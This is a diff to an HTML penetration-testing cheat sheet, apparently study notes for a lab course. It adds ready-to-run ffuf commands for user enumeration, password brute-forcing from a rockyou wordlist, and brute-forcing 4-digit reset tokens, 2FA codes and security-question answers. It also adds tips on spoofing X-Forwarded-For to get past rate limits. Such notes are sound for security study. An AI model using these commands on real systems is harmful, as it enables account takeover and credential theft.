@@ -1248,31 +1248,52 @@
 <h1 id="broken-authentication">Broken Authentication</h1>
 <h2 id="categories-of-authentication">Categories of Authentication</h2>
 <ul>
-<li>Knowledge: passwords, PINs, ...</li>
-<li>Ownership: ID cards, TOTP</li>
+<li>Knowledge: passwords, PINs, Answer to Security Question</li>
+<li>Ownership: ID cards, TOTP, Authenticator App, Security Token</li>
 <li>Inherence: Biometric authentication</li>
 </ul>
 <h2 id="brute-force-attacks">Brute-Force Attacks</h2>
 <ul>
-<li>User Enumeration</li>
-<li>Brute-Forcing Passwords</li>
-<li>Brute-Forcing Password Reset Tokens</li>
-<li>Brute-Forcing 2FA Codes</li>
+<li>User Enumeration </li>
 </ul>
+<pre><code class="language-bash">ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;username=FUZZ&amp;password=invalid&quot; -fr &quot;Unknown user&quot;
+</code></pre>
+<ul>
+<li>Brute-Forcing Passwords</li>
+</ul>
+<pre><code class="language-bash">grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' &gt; custom_wordlist.txt
+ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;username=admin&amp;password=FUZZ&quot; -fr &quot;Invalid username or password&quot;
+</code></pre>
+<ul>
+<li>Brute-Forcing Password Reset Tokens (example based on weak 4 digit reset token sent via email)</li>
+</ul>
+<pre><code class="language-bash">seq -w 0 9999 &gt; tokens.txt # -w pads numbers with prepending zeros
+ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr &quot;The provided token is invalid&quot;
+</code></pre>
+<ul>
+<li>Brute-Forcing 2FA Codes (example based on weak 4 digit TOTP token)</li>
+</ul>
+<pre><code class="language-bash">seq -w 0 9999 &gt; tokens.txt
+ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -b &quot;PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93&quot; -d &quot;otp=FUZZ&quot; -fr &quot;Invalid 2FA Code&quot;
+</code></pre>
 <h2 id="bypassing-brute-force-protection">Bypassing Brute-Force Protection</h2>
 <ul>
-<li><strong>Rate Limit</strong>: X-Forwarded-For HTTP Header</li>
+<li><strong>Rate Limit</strong>: X-Forwarded-For HTTP Header can be randomised</li>
 <li><strong>CAPTCHAs</strong>: Look for CAPTCHA solution in HTML code</li>
 </ul>
 <h2 id="password-attacks">Password Attacks</h2>
 <ul>
 <li><strong>Default Credentials</strong></li>
-<li>CIRT.net</li>
-<li>SecLists Default Credentials</li>
-<li>SCADA</li>
+<li><a href="https://cirt.net/passwords/">CIRT.net</a></li>
+<li>SecLists Default Credentials (SecLists\Passwords\Default-Credentials)</li>
+<li><a href="https://github.com/scadastrangelove/SCADAPASS/tree/master">SCADA</a></li>
 <li><strong>Vulnerable Password Reset</strong></li>
-<li>Guessable Security Questions</li>
-<li>Username Injection in Reset Request</li>
+<li>Guessable Security Questions (for example brute force <a href="https://github.com/datasets/world-cities/blob/main/data/world-cities.csv">world cities</a>)
+  <code>bash
+  cat world-cities.csv | cut -d ',' -f1 &gt; city_wordlist.txt # all world cities
+  cat world-cities.csv | grep Germany | cut -d ',' -f1 &gt; german_cities.txt # just german cities
+  ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."</code></li>
+<li>Username Injection in Password Reset Request (check post parameters in http request)</li>
 </ul>
 <h2 id="authentication-bypasses">Authentication Bypasses</h2>
 <ul>
